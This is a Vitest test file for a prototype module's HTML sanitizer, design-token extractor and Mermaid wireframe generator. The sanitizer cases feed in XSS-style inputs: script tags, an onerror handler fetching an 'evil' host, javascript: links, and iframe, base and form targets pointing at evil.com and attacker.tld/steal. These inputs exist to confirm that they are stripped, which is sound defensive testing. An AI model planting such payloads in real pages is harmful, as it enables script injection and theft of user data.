import { describe, expect, test } from "vitest";
import {
  PrototypePayloadTooLargeError,
  extractW3CDesignTokens,
  generateMermaidWireframeFromSpec,
  renderTokensToDesignMdSection,
  sanitizePrototypeHtml,
} from "../src/prototypes.js";

describe("@uzina/core/prototypes — Sanitizador HTML, Tokens W3C & Wireframes", () => {
  test.each([
    {
      name: "remove tag <script>",
      input: '<div>OK</div><script>alert("xss")</script>',
      forbidden: ["<script", "alert("],
      kept: "<div>OK</div>",
    },
    {
      name: "remove atributos onerror/onload/onclick",
      input:
        '<img src="https://cdn.example/a.png" onerror="fetch(\'https://evil\')" /><button onclick="hack()">Go</button>',
      forbidden: ["onerror", "onclick", "hack()"],
      kept: '<img src="https://cdn.example/a.png"',
    },
    {
      name: "neutraliza javascript: e data:text/html",
      input:
        '<a href="javascript:alert(1)">Link</a><a href="data:text/html,<script>1</script>">Data</a>',
      forbidden: ["javascript:", "data:text/html"],
      kept: 'href="#"',
    },
    {
      name: "remove iframe/object/embed/base/meta",
      input:
        '<base href="https://evil.com"><meta http-equiv="refresh" content="0"><iframe src="https://evil.com"></iframe><p>Safe</p>',
      forbidden: ["<iframe", "<base", "<meta"],
      kept: "<p>Safe</p>",
    },
    {
      name: "neutraliza action externo em form",
      input: '<form action="https://attacker.tld/steal"><button>Send</button></form>',
      forbidden: ["https://attacker.tld"],
      kept: 'action="#"',
    },
  ])(
    "sanitizePrototypeHtml: $name",
    ({ input, forbidden, kept }) => {
      const sanitized = sanitizePrototypeHtml(input);
      for (const bad of forbidden) {
        expect(sanitized.toLowerCase()).not.toContain(bad.toLowerCase());
      }
      expect(sanitized).toContain(kept);
    }
  );

  test("rejeita HTML acima do limite máximo com PrototypePayloadTooLargeError (413)", () => {
    const oversized = "<p>" + "a".repeat(300) + "</p>";
    expect(() =>
      sanitizePrototypeHtml(oversized, { maxBytes: 128 })
    ).toThrow(PrototypePayloadTooLargeError);
  });

  test("extractW3CDesignTokens extrai cores hex/oklch, tipografia, spacing e radius + gera seção DESIGN.md", () => {
    const html = `
      <style>
        :root { --accent: oklch(0.72 0.14 210); --bg: #0f172a; font-family: Plus Jakarta Sans, sans-serif; }
      </style>
      <main class="p-6 gap-4 rounded-xl font-mono">Painel Stitch</main>
    `;
    const tokens = extractW3CDesignTokens(html);
    expect(tokens.color.primary?.$value).toBe("oklch(0.72 0.14 210)");
    expect(tokens.color.surface?.$value).toBe("#0f172a");
    expect(tokens.typography.body?.$value).toContain("Plus Jakarta Sans");
    expect(tokens.spacing["space-6"]?.$value).toBe("1.50rem");
    expect(tokens.radius.xl?.$value).toBe("0.75rem");

    const md = renderTokensToDesignMdSection(tokens, "Checkout Stitch");
    expect(md).toContain("## Direção Visual Aprovada — Checkout Stitch");
    expect(md).toContain("oklch(0.72 0.14 210)");
  });

  test("generateMermaidWireframeFromSpec gera flowchart válido a partir da spec", () => {
    const mermaid = generateMermaidWireframeFromSpec(
      "Checkout",
      "Carrinho -> Pagamento -> Recibo"
    );
    expect(mermaid).toContain("flowchart LR");
    expect(mermaid).toContain('S1["Carrinho"] --> S2["Pagamento"]');
    expect(mermaid).toContain('S2["Pagamento"] --> S3["Recibo"]');
  });
});
